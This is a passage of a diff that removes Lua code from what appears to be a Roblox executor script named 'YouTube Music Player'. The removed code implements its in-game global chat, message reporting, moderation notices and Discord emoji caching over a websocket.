-		TelaCheia.Size = UDim2.new(0.18, -8, 0.29, 0)
-		FecharMini.Size = UDim2.new(0.18, -8, 0.29, 0)
-	else
-		udim24 = udim2
-		TelaCheia.Image = "rbxassetid://73952228795506"
-		fn2("125296945528316")
-		MiniBack.Size = UDim2.new(0.18, -8, 0.27, 0)
-		MiniRetroceder.Size = UDim2.new(0.18, -8, 0.27, 0)
-		MiniPlay.Size = UDim2.new(0.18, -8, 0.27, 0)
-		MiniAvancar.Size = UDim2.new(0.18, -8, 0.27, 0)
-		MiniSkip.Size = UDim2.new(0.18, -8, 0.27, 0)
-		TelaCheia.Size = UDim2.new(0.18, -8, 0.27, 0)
-		FecharMini.Size = UDim2.new(0.18, -8, 0.27, 0)
-	end
-
-	local tween12 = v6:Create(imageButton2, TweenInfo.new(0.6, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), { Size = udim24 })
-	tween12:Play()
-
-	tween12.Completed:Connect(function()
-		isAnimating = false
-	end)
-end)
-
-REPORT_ID = nil
-REPORT_MOTIVO = nil
-
-local function fn14(arg)
-	if REPORT_MOTIVO == nil then
-		fn3(Traducao.ReportErro, Traducao.ReportErro10, 8)
-		return
-	end
-	local n8 = #REPORT_MOTIVO
-	if n8 < 10 or n8 > 200 then
-		fn3(Traducao.ReportErro, Traducao.ReportErro11, 8)
-		return
-	end
-	Denunciar.Active = false
-	CancelarReport.Active = false
-	DenunciarTexto.Text = "..."
-	CancelarReportTexto.Text = "..."
-
-	local ok3, result3 = pcall(function()
-		return YmpRequest({
-			Url = str3 .. "/report",
-			Method = "POST",
-			Headers = { ["Content-Type"] = "application/json" },
-			Body = HttpService:JSONEncode({ key = KEY_ATUAL, hwid = YmpHwid(), msgid = tostring(arg), reason = REPORT_MOTIVO }),
-		})
-	end)
-
-	if ok3 then
-		local str10 = tostring(result3.Body or result3):gsub("^\"", ""):gsub("\"$", "")
-
-		if str10 == "request denied" then
-			fn3(Traducao.ReportErro, Traducao.ReportErro1, 8)
-		elseif str10 == "invalid report" then
-			fn3(Traducao.ReportErro, Traducao.ReportErro2, 8)
-		elseif str10 == "server error" then
-			fn3(Traducao.ReportErro, Traducao.ReportErro3, 8)
-		elseif str10 == "too many reports" then
-			fn3(Traducao.ReportErro, Traducao.ReportErro4, 8)
-		elseif str10 == "reporting to oneself is not allowed" then
-			fn3(Traducao.ReportErro, Traducao.ReportErro5, 8)
-		elseif str10 == "already reported by you" then
-			fn3(Traducao.ReportErro, Traducao.ReportErro6, 8)
-		elseif str10 == "already reported by another" then
-			fn3(Traducao.ReportErro, Traducao.ReportErro7, 8)
-		elseif str10 == "banned" then
-			fn3(Traducao.ReportErro, Traducao.ReportErro8, 8)
-		elseif string.find(tostring(str10), "reported") then
-			fn3(Traducao.ReportSucesso, Traducao.ReportSucesso2, 8)
-			task.wait(0.5)
-			REPORT_ID = nil
-			REPORT_MOTIVO = nil
-			TextoReportFrame.Text = ""
-			MotivoBox.Text = ""
-			FotoReport.Image = ""
-			ReportFrame.Visible = false
-			frame.Visible = true
-		else
-			fn3(Traducao.ReportErro, Traducao.ReportErro3, 8)
-		end
-	else
-		fn3(Traducao.ReportErro, Traducao.ReportErro3, 8)
-	end
-
-	task.wait(0.5)
-	Denunciar.Active = true
-	CancelarReport.Active = true
-	DenunciarTexto.Text = "Report"
-	CancelarReportTexto.Text = Traducao.Cancelar
-end
-
-Reportar = function(arg, arg2, image)
-	REPORT_ID = arg2
-	TextoReportFrame.Text = Traducao.AvisoReport1 .. " '{" .. arg .. "}' " .. Traducao.AvisoReport2
-	FotoReport.Image = image
-	ReportFrame.Visible = true
-	frame.Visible = false
-end
-
-local function fn15(arg)
-	if Warn.Visible then
-		return
-	end
-
-	if v12 and v12.Playing then
-		Pause()
-	end
-
-	if frame.Visible then
-		frame.Visible = false
-	end
-
-	if imageButton.Visible then
-		imageButton.Visible = false
-	end
-
-	if ReportFrame.Visible then
-		REPORT_ID = nil
-		TextoReportFrame.Text = ""
-		FotoReport.Image = ""
-		ReportFrame.Visible = false
-	end
-
-	task.wait(0.1)
-	CloseWarn.BackgroundTransparency = 0.7
-	CloseWarnTexto.TextColor3 = Color3.fromRGB(20, 20, 20)
-	Warn.Visible = true
-	BlurEffect.Size = 56
-	fn2("107089652181213")
-	TextoWarn.Text = Traducao.MsgMod .. " " .. arg
-	task.wait(5)
-	CloseWarn.BackgroundTransparency = 0
-	CloseWarnTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-end
-
-ProFinal = function()
-	local n8 = ScrollGC.AbsoluteCanvasSize.Y - ScrollGC.AbsoluteWindowSize.Y
-
-	if tween3 then
-		tween3:Cancel()
-	end
-
-	tween3 = v6:Create(ScrollGC, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { CanvasPosition = Vector2.new(0, n8) })
-	tween3:Play()
-end
-
-ChekFinal = function()
-	local y = ScrollGC.CanvasPosition.Y
-	return math.max(ScrollGC.AbsoluteCanvasSize.Y - ScrollGC.AbsoluteWindowSize.Y, 0) - y <= 5
-end
-
-local function fn16(arg, text2, arg2, arg3)
-	layoutOrder += 1
-	task.wait()
-
-	local function fn17(arg4)
-		if not (FotoTradu and FotoTradu.Image == "rbxassetid://72657045512999") then
-			return arg4
-		end
-
-		local ok3, result3 = pcall(function()
-			return TraduzirMsg(arg4)
-		end)
-
-		return ok3 and result3 or arg4
-	end
-
-	local v20 = fn17(arg2 or "")
-	local result3 = nil
-
-	if arg ~= "ymp" then
-		local num = tonumber(arg)
-		if not num then
-			return
-		end
-
-		if tbl11[num] then
-			result3 = tbl11[num]
-		else
-			local ok3
-
-			ok3, result3 = pcall(function()
-				local response = game:HttpGet("https://users.roblox.com/v1/users/" .. num)
-
-				return {
-					displayName = game:GetService("HttpService"):JSONDecode(response).displayName,
-					image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. num .. "&width=420&height=420&format=png",
-				}
-			end)
-
-			if not ok3 or not result3 or not result3.displayName then
-				return
-			end
-			tbl11[num] = result3
-		end
-	end
-
-	if not Tela5.Visible or imageButton.Visible == true then
-		NumeroGC()
-	end
-
-	local v21 = ChekFinal()
-	local frame3 = Instance.new("Frame")
-	frame3.Size = UDim2.new(0.9, 0, 0, 0)
-	frame3.AutomaticSize = Enum.AutomaticSize.Y
-	frame3.BackgroundTransparency = 1
-	frame3.BorderSizePixel = 0
-	frame3.LayoutOrder = layoutOrder
-	frame3.Parent = ScrollGC
-	local uiListLayout = Instance.new("UIListLayout")
-	uiListLayout.Parent = frame3
-	uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-	uiListLayout.Padding = UDim.new(0, 10)
-	local imageLabel = Instance.new("ImageLabel")
-	imageLabel.Size = UDim2.new(0, 40, 0, 40)
-	imageLabel.Position = UDim2.new(0, 1, 0, 1)
-	imageLabel.BackgroundTransparency = 1
-	imageLabel.Parent = frame3
-	local frame4 = Instance.new("Frame")
-	frame4.Size = UDim2.new(0, 60, 0, 15)
-	frame4.Position = UDim2.new(0, 47, 0, 12)
-	frame4.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-	frame4.BorderSizePixel = 0
-	frame4.Parent = imageLabel
-	local textLabel = Instance.new("TextLabel")
-	textLabel.Size = UDim2.new(1, 0, 1, 0)
-	textLabel.BackgroundTransparency = 1
-	textLabel.TextColor3 = Color3.fromRGB(192, 192, 192)
-	textLabel.Font = Enum.Font.SourceSansBold
-	textLabel.TextScaled = true
-	textLabel.Parent = frame4
-	local uiPadding = Instance.new("UIPadding")
-	uiPadding.PaddingLeft = UDim.new(0, 1)
-	uiPadding.PaddingTop = UDim.new(0, 1)
-	uiPadding.PaddingRight = UDim.new(0, 1)
-	uiPadding.PaddingBottom = UDim.new(0, 1)
-	uiPadding.Parent = textLabel
-	local frame5 = Instance.new("Frame")
-	frame5.Size = UDim2.new(0, 60, 0, 15)
-	frame5.Position = UDim2.new(0, 112, 0, 12)
-	frame5.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-	frame5.BorderSizePixel = 0
-	frame5.Parent = imageLabel
-	local textLabel2 = Instance.new("TextLabel")
-	textLabel2.Size = UDim2.new(1, -7, 1, 0)
-	textLabel2.Position = UDim2.new(0, 4, 0, 0)
-	textLabel2.BackgroundTransparency = 1
-	textLabel2.TextColor3 = Color3.fromRGB(192, 192, 192)
-	textLabel2.Font = Enum.Font.SourceSansBold
-	textLabel2.TextScaled = true
-	textLabel2.Parent = frame5
-	local imageButton3 = Instance.new("ImageButton")
-	imageButton3.Size = UDim2.new(0, 17, 0, 17)
-	imageButton3.Position = UDim2.new(0, 177, 0, 12)
-	imageButton3.BackgroundTransparency = 1
-	imageButton3.BorderSizePixel = 0
-	imageButton3.Parent = imageLabel
-	local textLabel3 = Instance.new("TextLabel")
-	textLabel3.Size = UDim2.new(1, 0, 1, 0)
-	textLabel3.BackgroundTransparency = 1
-	textLabel3.Font = Enum.Font.SourceSansBold
-	textLabel3.TextScaled = true
-	textLabel3.TextColor3 = Color3.fromRGB(192, 192, 192)
-	textLabel3.Text = "C"
-	textLabel3.Parent = imageButton3
-	local imageButton4 = Instance.new("ImageButton")
-	imageButton4.Size = UDim2.new(0, 17, 0, 17)
-	imageButton4.Position = UDim2.new(0, 200, 0, 12)
-	imageButton4.BackgroundTransparency = 1
-	imageButton4.BorderSizePixel = 0
-	imageButton4.Visible = arg ~= tostring(userId) and arg ~= "ymp"
-	imageButton4.Parent = imageLabel
-	local imageLabel2 = Instance.new("ImageLabel")
-	imageLabel2.Size = UDim2.new(0, 10, 0, 10)
-	imageLabel2.Position = UDim2.new(0, 4, 0, 4)
-	imageLabel2.BackgroundTransparency = 1
-	imageLabel2.Image = "rbxassetid://74995247007994"
-	imageLabel2.Parent = imageButton4
-	local textSize = game:GetService("TextService"):GetTextSize(v20, 16, Enum.Font.SourceSansBold, Vector2.new(170, math.huge))
-	local frame6 = Instance.new("Frame")
-	frame6.Size = UDim2.new(0, 180, 0, textSize.Y + 10)
-	frame6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	frame6.BackgroundTransparency = 0.7
-	frame6.BorderSizePixel = 0
-	frame6.Parent = frame3
-	local textLabel4 = Instance.new("TextLabel")
-	textLabel4.Size = UDim2.new(0, 170, 0, textSize.Y)
-	textLabel4.BackgroundTransparency = 1
-	textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
-	textLabel4.Font = Enum.Font.SourceSansBold
-	textLabel4.TextWrapped = true
-	textLabel4.TextXAlignment = Enum.TextXAlignment.Left
-	textLabel4.TextYAlignment = Enum.TextYAlignment.Top
-	textLabel4.TextSize = 14
-	textLabel4.Text = v20
-	textLabel4.Parent = frame6
-	local uiPadding2 = Instance.new("UIPadding")
-	uiPadding2.PaddingLeft = UDim.new(0, 5)
-	uiPadding2.PaddingRight = UDim.new(0, 5)
-	uiPadding2.PaddingTop = UDim.new(0, 5)
-	uiPadding2.PaddingBottom = UDim.new(0, 5)
-	uiPadding2.Parent = frame6
-
-	imageButton3.MouseButton1Click:Connect(function()
-		fn3(Traducao.TextoCopiado, v20, 5)
-		YmpClipboard(v20)
-	end)
-
-	if arg == "ymp" then
-		imageLabel.Image = "rbxassetid://83758613781843"
-		imageLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-		textLabel.Text = "YMP OFFICIAL"
-		textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-		textLabel2.Text = Traducao.Sistema
-		textLabel2.TextColor3 = Color3.fromRGB(255, 0, 0)
-		textLabel3.TextColor3 = Color3.fromRGB(255, 0, 0)
-		Stroke(imageLabel, 255, 255, 255, 1)
-		Stroke(frame4, 255, 255, 255, 1)
-		Stroke(frame5, 255, 255, 255, 1)
-		Stroke(imageButton3, 255, 255, 255, 1)
-		Stroke(imageButton4, 255, 255, 255, 1)
-		Stroke(textLabel2, 255, 255, 255, 0.5)
-		Stroke(textLabel3, 255, 255, 255, 0.5)
-		Stroke(textLabel, 255, 255, 255, 0.5)
-	else
-		imageLabel.Image = result3.image and result3.image ~= "" and result3.image or "rbxassetid://106804518898726"
-		textLabel.Text = result3.displayName
-		textLabel2.Text = text2
-		Stroke(imageLabel, 50, 50, 50, 1)
-		Stroke(frame4, 50, 50, 50, 1)
-		Stroke(frame5, 50, 50, 50, 1)
-		Stroke(imageButton3, 50, 50, 50, 1)
-		Stroke(imageButton4, 50, 50, 50, 1)
-		Stroke(textLabel, 50, 50, 50, 0.5)
-	end
-
-	Corner(imageLabel, 30)
-	Corner(frame4, 30)
-	Corner(frame5, 30)
-	Corner(imageButton3, 30)
-	Corner(imageButton4, 30)
-	Corner(frame6, 5)
-	Stroke(frame6, 50, 50, 50, 0.2)
-
-	imageButton4.MouseButton1Click:Connect(function()
-		if not flag19 then
-			fn3(Traducao.ReportErro, Traducao.ReportErro1, 10)
-			return
-		end
-		Reportar(text2, arg3, imageLabel.Image)
-	end)
-
-	if v21 then
-		task.wait()
-		ProFinal()
-	end
-end
-
-local function fn17(arg, text2, arg2, arg3, arg4)
-	layoutOrder += 1
-	task.wait()
-	local str10 = arg4 or ""
-
-	local function fn18(arg5)
-		local tbl17 = {}
-		local n8 = 1
-
-		while n8 <= #arg5 do
-			local v20, v21, v22, v23 = string.find(arg5, "<:([%w_]+):(%d+)>", n8)
-
-			if v20 then
-				if v20 > n8 then
-					table.insert(tbl17, { tipo = "texto", valor = string.sub(arg5, n8, v20 - 1) })
-				end
-
-				table.insert(tbl17, { tipo = "emoji", id = v23 })
-				n8 = v21 + 1
-			else
-				table.insert(tbl17, { tipo = "texto", valor = string.sub(arg5, n8) })
-				break
-			end
-		end
-
-		return tbl17
-	end
-
-	local function fn19(arg5)
-		if not (FotoTradu and FotoTradu.Image == "rbxassetid://72657045512999") then
-			return arg5
-		end
-
-		local ok3, result3 = pcall(function()
-			return TraduzirMsg(arg5)
-		end)
-
-		return ok3 and result3 or arg5
-	end
-
-	local v20 = fn18(str10)
-
-	for _, v21 in ipairs(v20) do
-		if v21.tipo == "texto" then
-			v21.valor = fn19(v21.valor)
-		end
-	end
-
-	local tbl17 = {}
-
-	for _, v21 in ipairs(v20) do
-		if v21.tipo == "emoji" then
-			local id = v21.id
-			local str11 = "YouTube Music Player/internal/Cache/emoji_" .. id .. ".png"
-
-			if isfile and isfile(str11) then
-				tbl17[id] = getcustomasset(str11)
-			else
-				local ok3, result3 = pcall(function()
-					return game:HttpGet("https://cdn.discordapp.com/emojis/" .. id .. ".png")
-				end)
-
-				ok3 = ok3 and result3 and writefile
-				local str12 = "rbxassetid://110787075859454"
-
-				if ok3 then
-					if pcall(function()
-						writefile(str11, result3)
-					end) and getcustomasset then
-						str12 = getcustomasset(str11)
-					end
-				end
-
-				tbl17[id] = str12
-			end
-		end
-	end
-
-	local str11 = "YouTube Music Player/internal/Cache/Dc_" .. tostring(arg) .. ".jpg"
-	local image
-
-	if isfile and isfile(str11) then
-		image = getcustomasset(str11)
-	else
-		local ok3, result3 = pcall(function()
-			return game:HttpGet(arg3)
-		end)
-
-		ok3 = ok3 and writefile
-		image = "rbxassetid://106804518898726"
-
-		if ok3 then
-			if pcall(function()
-				writefile(str11, result3)
-			end) and getcustomasset then
-				image = getcustomasset(str11)
-			end
-		end
-	end
-
-	if not Tela5.Visible or imageButton.Visible == true then
-		NumeroGC()
-	end
-
-	local v21 = ChekFinal()
-	local frame3 = Instance.new("Frame")
-	frame3.Size = UDim2.new(0.9, 0, 0, 0)
-	frame3.AutomaticSize = Enum.AutomaticSize.Y
-	frame3.BackgroundTransparency = 1
-	frame3.BorderSizePixel = 0
-	frame3.LayoutOrder = layoutOrder
-	frame3.Parent = ScrollGC
-	local uiListLayout = Instance.new("UIListLayout")
-	uiListLayout.Parent = frame3
-	uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-	uiListLayout.Padding = UDim.new(0, 10)
-	local imageLabel = Instance.new("ImageLabel")
-	imageLabel.Size = UDim2.new(0, 40, 0, 40)
-	imageLabel.Position = UDim2.new(0, 4, 0, 4)
-	imageLabel.BackgroundTransparency = 1
-	imageLabel.Image = image
-	imageLabel.Parent = frame3
-	local frame4 = Instance.new("Frame")
-	frame4.Size = UDim2.new(0, 60, 0, 15)
-	frame4.Position = UDim2.new(0, 47, 0, 12)
-	frame4.Parent = imageLabel
-	local textLabel = Instance.new("TextLabel")
-	textLabel.Size = UDim2.new(1, 0, 1, 0)
-	textLabel.Position = UDim2.new(0, 0, 0, 0)
-	textLabel.BackgroundTransparency = 1
-	textLabel.Text = text2 or ""
-	textLabel.Font = Enum.Font.SourceSansBold
-	textLabel.TextScaled = true
-	textLabel.Parent = frame4
-	local uiPadding = Instance.new("UIPadding")
-	uiPadding.PaddingLeft = UDim.new(0, 1)
-	uiPadding.PaddingTop = UDim.new(0, 1)
-	uiPadding.PaddingRight = UDim.new(0, 1)
-	uiPadding.PaddingBottom = UDim.new(0, 1)
-	uiPadding.Parent = textLabel
-	local frame5 = Instance.new("Frame")
-	frame5.Size = UDim2.new(0, 60, 0, 15)
-	frame5.Position = UDim2.new(0, 112, 0, 12)
-	frame5.BorderSizePixel = 0
-	frame5.Parent = imageLabel
-	local textLabel2 = Instance.new("TextLabel")
-	textLabel2.Size = UDim2.new(1, -7, 1, 0)
-	textLabel2.Position = UDim2.new(0, 4, 0, 0)
-	textLabel2.BackgroundTransparency = 1
-	textLabel2.Font = Enum.Font.SourceSansBold
-	textLabel2.TextScaled = true
-	textLabel2.Parent = frame5
-	local frame6 = Instance.new("Frame")
-	frame6.Size = UDim2.new(1, -10, 0, 0)
-	frame6.AutomaticSize = Enum.AutomaticSize.Y
-	frame6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	frame6.BackgroundTransparency = 0.7
-	frame6.Parent = frame3
-	local uiPadding2 = Instance.new("UIPadding")
-	uiPadding2.PaddingLeft = UDim.new(0, 5)
-	uiPadding2.PaddingRight = UDim.new(0, 5)
-	uiPadding2.PaddingTop = UDim.new(0, 5)
-	uiPadding2.PaddingBottom = UDim.new(0, 5)
-	uiPadding2.Parent = frame6
-	local imageButton3 = Instance.new("ImageButton")
-	imageButton3.Size = UDim2.new(0, 17, 0, 17)
-	imageButton3.Position = UDim2.new(0, 177, 0, 12)
-	imageButton3.BorderSizePixel = 0
-	imageButton3.Parent = imageLabel
-	local textLabel3 = Instance.new("TextLabel")
-	textLabel3.Size = UDim2.new(1, -7, 1, 0)
-	textLabel3.Position = UDim2.new(0, 3, 0, 0)
-	textLabel3.BackgroundTransparency = 1
-	textLabel3.Font = Enum.Font.SourceSansBold
-	textLabel3.TextScaled = true
-	textLabel3.Text = "C"
-	textLabel3.Parent = imageButton3
-	local uiListLayout2 = Instance.new("UIListLayout")
-	uiListLayout2.FillDirection = Enum.FillDirection.Horizontal
-	uiListLayout2.Wraps = true
-	uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
-	uiListLayout2.Padding = UDim.new(0, 2)
-	uiListLayout2.Parent = frame6
-	local uiPadding3 = Instance.new("UIPadding")
-	uiPadding3.PaddingLeft = UDim.new(0, 5)
-	uiPadding3.PaddingTop = UDim.new(0, 5)
-	uiPadding3.PaddingRight = UDim.new(0, 5)
-	uiPadding3.PaddingBottom = UDim.new(0, 5)
-	uiPadding3.Parent = frame6
-
-	imageButton3.MouseButton1Click:Connect(function()
-		fn3(Traducao.TextoCopiado, arg4, 5)
-		YmpClipboard(arg4)
-	end)
-
-	local function fn20(text3)
-		if text3 == "" then
-			return
-		end
-		local textLabel4 = Instance.new("TextLabel")
-		textLabel4.BackgroundTransparency = 1
-		textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
-		textLabel4.Font = Enum.Font.SourceSansBold
-		textLabel4.TextSize = 14
-		textLabel4.TextWrapped = true
-		textLabel4.TextXAlignment = Enum.TextXAlignment.Left
-		textLabel4.TextYAlignment = Enum.TextYAlignment.Top
-		textLabel4.Text = text3
-		local textSize = game:GetService("TextService"):GetTextSize(text3, 16, Enum.Font.SourceSansBold, Vector2.new(170, math.huge))
-		local max = math.max
-		local y = textSize.Y
-		textLabel4.Size = UDim2.new(0, math.min(textSize.X, 170), 0, max(y, 21))
-		textLabel4.Parent = frame6
-	end
-
-	local function fn21(arg5)
-		local imageLabel2 = Instance.new("ImageLabel")
-		imageLabel2.Size = UDim2.new(0, 21, 0, 21)
-		imageLabel2.BackgroundTransparency = 1
-		imageLabel2.Image = tbl17[arg5]
-		imageLabel2.Parent = frame6
-	end
-
-	for _, v22 in ipairs(v20) do
-		if v22.tipo == "texto" then
-			fn20(v22.valor)
-		else
-			fn21(v22.id)
-		end
-	end
-
-	if arg2 == "Mod" then
-		textLabel.TextColor3 = Color3.fromRGB(255, 160, 122)
-		frame4.BackgroundColor3 = Color3.fromRGB(255, 99, 71)
-		frame5.BackgroundColor3 = Color3.fromRGB(255, 99, 71)
-		imageButton3.BackgroundColor3 = Color3.fromRGB(255, 99, 71)
-		textLabel2.Text = "Mod"
-		textLabel2.TextColor3 = Color3.fromRGB(255, 160, 122)
-		textLabel3.TextColor3 = Color3.fromRGB(255, 160, 122)
-		Stroke(frame4, 255, 160, 122, 1)
-		Stroke(imageLabel, 255, 160, 122, 1.5)
-		Stroke(frame5, 255, 160, 122, 1)
-		Stroke(imageButton3, 255, 160, 122, 1)
-		Stroke(textLabel, 0, 0, 0, 1)
-		Stroke(textLabel2, 0, 0, 0, 1)
-		Stroke(textLabel3, 0, 0, 0, 1)
-	elseif arg2 == "Admin" then
-		textLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
-		frame4.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-		frame5.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-		imageButton3.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-		textLabel2.Text = "Admin"
-		textLabel2.TextColor3 = Color3.fromRGB(220, 20, 60)
-		textLabel3.TextColor3 = Color3.fromRGB(220, 20, 60)
-		Stroke(frame4, 220, 20, 60, 1)
-		Stroke(imageLabel, 220, 20, 60, 1)
-		Stroke(frame5, 220, 20, 60, 1)
-		Stroke(imageButton3, 220, 20, 60, 1)
-		Stroke(textLabel, 0, 0, 0, 1)
-		Stroke(textLabel2, 0, 0, 0, 1)
-		Stroke(textLabel3, 0, 0, 0, 1)
-	elseif arg2 == "Dev" then
-		textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
-		frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-		frame5.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-		imageButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-		textLabel2.Text = "Dev"
-		textLabel2.TextColor3 = Color3.fromRGB(255, 215, 0)
-		textLabel3.TextColor3 = Color3.fromRGB(255, 215, 0)
-		Stroke(frame4, 0, 0, 0, 1.5)
-		Stroke(imageLabel, 0, 0, 0, 1.5)
-		Stroke(textLabel, 0, 0, 0, 1)
-		Stroke(frame5, 0, 0, 0, 1.5)
-		Stroke(imageButton3, 0, 0, 0, 1.5)
-		Stroke(textLabel2, 0, 0, 0, 1)
-		Stroke(textLabel3, 0, 0, 0, 1)
-	else
-		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-		frame4.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
-		frame5.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
-		imageButton3.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
-		textLabel2.Text = "Discord"
-		textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
-		textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
-		Stroke(frame4, 255, 255, 255, 1)
-		Stroke(imageLabel, 255, 255, 255, 1)
-		Stroke(textLabel, 0, 0, 0, 0.5)
-		Stroke(frame5, 255, 255, 255, 1)
-		Stroke(imageButton3, 255, 255, 255, 1)
-		Stroke(textLabel2, 0, 0, 0, 0.5)
-		Stroke(textLabel3, 0, 0, 0, 0.5)
-	end
-
-	Corner(imageLabel, 30)
-	Corner(frame4, 30)
-	Corner(frame5, 30)
-	Corner(imageButton3, 30)
-	Corner(frame6, 5)
-	Stroke(frame6, 50, 50, 50, 0.2)
-
-	if v21 then
-		task.wait()
-		ProFinal()
-	end
-end
-
-IndoFinal = function(arg)
-	if arg == v13 then
-		return
-	end
-	estadoAtual = arg
-	local v20 = arg and udim23 or udim22
-
-	if v13 then
-		tween2:Cancel()
-	end
-
-	tween2 = v6:Create(FinalGC, tweenInfo3, { Position = v20 })
-	tween2:Play()
-end
-
-ScrollGC:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
-	local y = ScrollGC.CanvasPosition.Y
-	local flag22 = math.max(ScrollGC.AbsoluteCanvasSize.Y - ScrollGC.AbsoluteWindowSize.Y, 0) - y <= 120
-
-	if flag22 ~= flag15 then
-		flag15 = flag22
-		IndoFinal(flag22)
-	end
-end)
-
-FinalGC.MouseButton1Click:Connect(function()
-	ProFinal()
-end)
-
-ScrollGC.ChildAdded:Connect(function()
-	local tbl17 = {}
-	EsperandoIMG.Visible = false
-	ScrollGC.Visible = true
-
-	for _, child in ipairs(ScrollGC:GetChildren()) do
-		if child:IsA("Frame") then
-			table.insert(tbl17, child)
-		end
-	end
-
-	if #tbl17 > 30 then
-		table.sort(tbl17, function(arg, arg2)
-			return arg.LayoutOrder < arg2.LayoutOrder
-		end)
-
-		task.wait()
-		tbl17[1]:Destroy()
-	end
-end)
-
-local function fn18(arg)
-	MsgErroGC.Visible = true
-	MsgErroGC.Text = Traducao.GcBan .. " " .. tostring(arg or "")
-	GCBox.Active = false
-	GCBox.Visible = false
-	SendGC.Visible = false
-	Traduzir.Visible = false
-	LinhaTraducao.Visible = false
-	fn3(Traducao.Banido, Traducao.GcBan .. " " .. tostring(arg or ""), 10)
-end
-
-local function fn19()
-	fn3(Traducao.Desbanido, Traducao.GcUnban, 10)
-
-	if flag19 then
-		MsgErroGC.Visible = false
-		GCBox.Active = true
-		GCBox.Visible = true
-		SendGC.Visible = true
-		Traduzir.Visible = true
-		LinhaTraducao.Visible = true
-	else
-		MsgErroGC.Text = Traducao.GcKey
-	end
-end
-
-local function fn20(arg)
-	if arg == flag20 then
-		return
-	end
-
-	if flag19 then
-		return
-	end
-
-	if arg then
-		if not flag16 and websocket_ ~= nil then
-			flag20 = true
-			MsgErroGC.Visible = false
-			GCBox.Active = true
-			GCBox.Visible = true
-			SendGC.Visible = true
-			Traduzir.Visible = true
-			LinhaTraducao.Visible = true
-			fn3(Traducao.Keyless, Traducao.KeylessOn, 15, 93360393539898)
-		end
-	elseif not flag19 and not flag16 then
-		flag20 = false
-		MsgErroGC.Visible = true
-		MsgErroGC.Text = Traducao.GcKey
-		GCBox.Active = false
-		GCBox.Visible = false
-		SendGC.Visible = false
-		Traduzir.Visible = false
-		LinhaTraducao.Visible = false
-		fn3(Traducao.Keyless, Traducao.KeylessOff, 15, 93360393539898)
-	end
-end
-
-hwidUrl = "wss://ymp-api.ddns.net/gc" .. "?hwid=" .. tostring(YmpHwid())
-
-task.spawn(function()
-	local flag22 = false
-	local v20 = nil
-	local n8 = 0
-	local n9 = 0
-
-	local function fn21()
-		if not websocket_ then
-			return
-		end
-
-		if flag22 then
-			return
-		end
-		flag22 = true
-		n8 += 1
-
-		local ok3, result3 = pcall(function()
-			local connect = websocket_.connect or websocket_.Connect or websocket_.new or websocket_.New
-			if not connect then
-				return nil
-			end
-			return connect(hwidUrl)
-		end)
-
-		if not ok3 or not result3 then
-			flag22 = false
-			return
-		end
-		v20 = result3
-		flag22 = false
-
-		if v20.OnClose then
-			v20.OnClose:Connect(function()
-				v20 = nil
-			end)
-		end
-
-		local onMessage = result3.OnMessage or result3.onmessage or result3.MessageReceived
-
-		if onMessage then
-			onMessage:Connect(function(arg)
-				if not arg then
-					return
-				end
-
-				if arg == "keyless" then
-					fn20(true)
-					return
-				end
-
-				if arg == "unkeyless" then
-					fn20(false)
-					return
-				end
-
-				if arg:sub(1, 6) == "banned" then
-					local match = arg:match("banned:%s*(%S+)")
-					flag16 = true
-					fn18(match)
-					return
-				end
-
-				if arg == "unbanned" then
-					flag16 = false
-					fn19()
-					return
-				end
-
-				if arg:sub(1, 6) == "warned" then
-					fn15(arg:match("reason:%s*(.+)") or "")
-					return
-				end
-
-				if arg:sub(1, 6) == "system" then
-					local match = arg:match("message:%s*(.+)")
-
-					if match then
-						fn16("ymp", "a", match, "0")
-						fn3(Traducao.Sistema, match, 10)
-					else
-						local match2 = arg:match("system\n(.+)")
-
-						if match2 then
-							fn16("ymp", "a", match2, "0")
-						end
-					end
-
-					return
-				end
-
-				if arg:sub(1, 7) == "discord" then
-					local match = arg:match("id:%s*([^\n]+)")
-					local match2 = arg:match("name:%s*([^\n]+)")
-					local match3 = arg:match("rank:%s*([^\n]+)")
-					local match4 = arg:match("image:%s*([^\n]*)")
-					local match5 = arg:match("message:%s*(.+)")
-
-					if match and match2 and match3 and match5 then
-						fn17(match, match2, match3, match4 ~= "" and match4 or nil, match5)
-					end
-
-					return
-				end
-
-				local match = arg:match("UserId:%s*(%d+)")
-				local match2 = arg:match("id:%s*(%S+)")
-				local match3 = arg:match("message:%s*(.+)")
-				local match4 = arg:match("msgid:%s*(%d+)")
-
-				if match and match2 and match3 then
-					fn16(match, match2, match3, match4)
-				end
-			end)
-		end
-	end
-
-	task.spawn(function()
-		while task.wait(2) do
-			if websocket_ then
-				if not flag22 then
-					if not v20 then
-						if not (os.clock() - n9 < 3) then
-							n9 = os.clock()
-							fn21()
-						end
-					end
-				end
-			end
-		end
-	end)
-
-	fn21()
-end)
-
-local function fn21(arg)
-	if not arg or arg == "" then
-		return
-	end
-
-	if not CheckRequest() then
-		return
-	end
-
-	local v20 = YmpRequest({
